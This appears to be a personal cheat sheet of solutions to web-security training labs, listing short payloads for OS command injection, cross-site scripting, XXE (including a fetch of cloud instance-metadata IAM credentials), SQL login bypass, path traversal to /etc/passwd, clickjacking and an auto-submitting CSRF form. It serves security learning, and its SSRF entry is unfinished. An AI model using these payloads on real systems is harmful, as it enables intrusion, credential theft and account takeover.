## OS command injection

### **lab-simple**

```sh
| whoami & return
```

in `storeId` payload for the POST request to `/product/stock`.

### **lab-blind-output-redirection**

```sh
$(whoami > /var/www/images/test.txt)
```

## Cross-site scripting

### **contexts/lab-javascript-string-single-quote-backslash-escaped**

```html
</script><script>alert(1)</script>
```

### **contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped**

```js
${2*2}
${alert(1)}
```

### **dom-based/lab-innerhtml-sink**

1.

```js
<input type="text" id="fname" onfocus="alert(1)" autofocus>
```

2.

```js
<img src="" onerror="alert(1)">
```

## XML external entity (XXE) injection

### **lab-exploiting-xxe-to-perform-ssrf**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
					<!ENTITY burp SYSTEM "http://2ad67spwbgr9ywvf1rawnourdijd72.burpcollaborator.net">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
<productId>
&xxe;
</productId><storeId>
&xxe;
</storeId></stockCheck>
```

[Docs](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
<br>
[Docs](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html)

## WebSockets

### **lab-manipulating-messages-to-exploit-vulnerabilities**

1. Breakpoint at line 56
2. In console type:

```js
object.message = "<img src=x onerror=alert(1)>";
```

## SQL injection

### **lab-login-bypass**

1. Username:

```
admin
```

2. Password:

```
' OR TRUE --
```

## Directory traversal

### **lab-simple**

```
/image?filename=../../../etc/passwd
```

## Clickjacking

### **lab-basic-csrf-protected**

```html
<button
  class="button"
  style="width:120px; height:30px; border-radius: 25px; position: absolute; left: 40px; top: 500px; z-index: -1;"
  type="submit"
>
  click
</button>
<iframe
  style="position: absolute; opacity:0.4;"
  width="600"
  height="550"
  src="[CHALLENGE DOMAIN]/my-account"
></iframe>
```

## CSRF

### **lab-no-defenses**

```html
Hello, world!
<body>
<form id=“form” action=“https://acd91f201fb13c7b80a4006200f200b3.web-security-academy.net/my-account/change-email” method=“POST”>
                            <label>Email</label>
                            <input required=“” type=“email” name=“email” value=“eisenmann@codih.site”>
                            <button class=“button” type=“submit”> Update email </button>
                        </form>
<script>
window.onload = function(){
window.document.querySelector(‘#form’).submit()
}
</script>
</body>
```

## SSRF

### **lab-basic-ssrf-against-backend-system**

??????????
